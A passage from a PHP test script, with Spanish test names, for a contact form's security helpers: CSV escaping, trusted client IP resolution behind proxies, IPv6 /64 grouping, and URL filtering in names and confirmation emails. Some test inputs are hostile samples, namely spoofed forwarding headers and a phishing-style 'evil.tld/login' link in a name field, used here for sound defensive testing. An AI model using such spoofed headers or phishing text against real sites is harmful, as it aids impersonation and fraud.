eq('un importe negativo también', csv_celda('-1500.50'), '-1500.50');
eq('el texto común no se toca', csv_celda('Juana Prueba'), 'Juana Prueba');

// ---- IP del visitante: la que vio el servidor ----
$_SERVER['REMOTE_ADDR'] = '203.0.113.7';
$_SERVER['HTTP_X_FORWARDED_FOR'] = '1.2.3.4, 203.0.113.7';
$_SERVER['HTTP_CLIENT_IP'] = '8.8.8.8';
eq('las cabeceras que escribe el cliente no cuentan', ip_confiable(), '203.0.113.7');
$GLOBALS['CONFIG']['app']['proxies_confiables'] = ['203.0.113.0/24'];
$_SERVER['HTTP_X_FORWARDED_FOR'] = '1.2.3.4, 198.51.100.9';
eq('detrás de un proxy propio, el último salto que no es del proxy', ip_confiable(), '198.51.100.9');
unset($GLOBALS['CONFIG']['app']['proxies_confiables'], $_SERVER['HTTP_X_FORWARDED_FOR'], $_SERVER['HTTP_CLIENT_IP']);
eq('IPv6: se cuenta por la red /64', ip_red('2001:db8:1:2:aaaa:bbbb:cccc:dddd'), '2001:db8:1:2::/64');
eq('dos direcciones del mismo /64 dan lo mismo', ip_red('2001:db8:1:2::1'), ip_red('2001:db8:1:2:ffff::9'));
eq('IPv4: la IP', ip_red('203.0.113.7'), '203.0.113.7');
ok('rango CIDR v4', ip_en_rango('203.0.113.200', '203.0.113.0/24') && !ip_en_rango('203.0.114.1', '203.0.113.0/24'));

// ---- Nombre y empresa sin direcciones web ----
ok('un nombre con https:// no pasa', !texto_sin_enlaces('Juan, verificá en https://evil.tld/login'));
ok('ni con www.', !texto_sin_enlaces('Ver www.evil.tld'));
ok('un nombre común sí', texto_sin_enlaces('María José Pérez-Gómez'));
[, $errLink] = api_validar_entrada(['persona' => ['nombre' => 'Juan https://evil.tld', 'empresa' => 'ACME',
    'email' => 'bsierra@intellihelp.tech', 'telefono' => '', 'servicio' => '', 'mensaje' => '']], false);
ok('la API rechaza el nombre con enlace', isset($errLink['nombre']));
[, $errLargo] = api_validar_entrada(['persona' => ['nombre' => str_repeat('a', 121), 'empresa' => 'ACME',
    'email' => 'bsierra@intellihelp.tech', 'telefono' => '', 'servicio' => '', 'mensaje' => '']], false);
ok('y el nombre de más de 120 (no entra en la ficha del contacto)', isset($errLargo['nombre']));

// ---- Correo de confirmación: sin enlaces de lo que escribió el visitante ----
$htmlSin = bloques_render([['tipo' => 'texto', 'texto' => 'Hola https://evil.tld,', 'sin_enlaces' => true]], [], []);
no_contiene('un texto marcado sin_enlaces no se enlaza', $htmlSin, 'href="https://evil.tld');
$htmlCon = bloques_render([['tipo' => 'texto', 'texto' => 'Cambialo acá: https://intellihelp.tech/crm/r/mover']], [], []);
contiene('el resto de los textos sigue enlazando', $htmlCon, 'href="https://intellihelp.tech/crm/r/mover"');

echo "\n";
echo str_repeat('=', 56) . "\n";
printf("  %d pruebas · %d correctas · %d fallidas\n", $T, $T - $F, $F);
if ($fallos) {
    echo "\n  Fallaron:\n";
    foreach ($fallos as $f) { echo "   - $f\n"; }
}
echo str_repeat('=', 56) . "\n";
exit($F > 0 ? 1 : 0);
